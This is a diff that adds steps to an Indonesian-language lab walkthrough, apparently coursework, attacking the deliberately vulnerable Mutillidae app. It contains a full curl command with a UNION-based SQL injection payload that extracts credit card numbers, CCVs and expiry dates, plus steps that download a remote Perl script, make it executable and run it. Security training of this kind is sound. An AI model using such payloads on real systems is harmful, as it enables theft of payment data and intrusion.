@@ -20,3 +20,9 @@ Lesson 8
 ![](https://github.com/nezarmahardika/FPPKSJ/blob/master/mutillidae/lesson%208/8.JPG)
 - **Step 7**    : Lalu buka aplikasi burpsuite, pada tab proxy, lalu HTTP history, buka pada host yang terdapat method get yang baru kita lakukan pada mutillidae
 ![](https://github.com/nezarmahardika/FPPKSJ/blob/master/mutillidae/lesson%208/9.JPG)
+- **Step 8**    : Lalu ketik `curl -c crack_cookies.txt --user-agent "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)" --data "page=user-info.php&username=%27+union+select+ccid%2Cccnumber%2Cccv%2Cexpiration%2Cnull+from+credit_cards--+&password=&user-info-php-submit-button=View+Account+Details" --location "10.151.36.160/mutillidae/index.php" --cookie PHPSESSID=13c43bde4b32699c9a96034fc9e26134 | grep -i "Username=" > lesson8.txt` lalu ketik `cat lesson8.txt`
+- Lalu akan muncul hasilnya seperti gambar berikut
+![](https://github.com/nezarmahardika/FPPKSJ/blob/master/mutillidae/lesson%208/10.JPG)
+![](https://github.com/nezarmahardika/FPPKSJ/blob/master/mutillidae/lesson%208/11.JPG)
+- **Step 9**    : Lalu ketik `wget http://www.computersecuritystudent.com/SECURITY_TOOLS/MUTILLIDAE/MUTILLIDAE_2511/lesson8/lesson8.pl.TXT` lalu `mv lesson8.pl.TXT lesson8.pl` lalu `chmod 700 lesson8.pl` lalu `./lesson8.pl` dan akan muncul hasilnya seperti berikut
+![](https://github.com/nezarmahardika/FPPKSJ/blob/master/mutillidae/lesson%208/13.JPG)
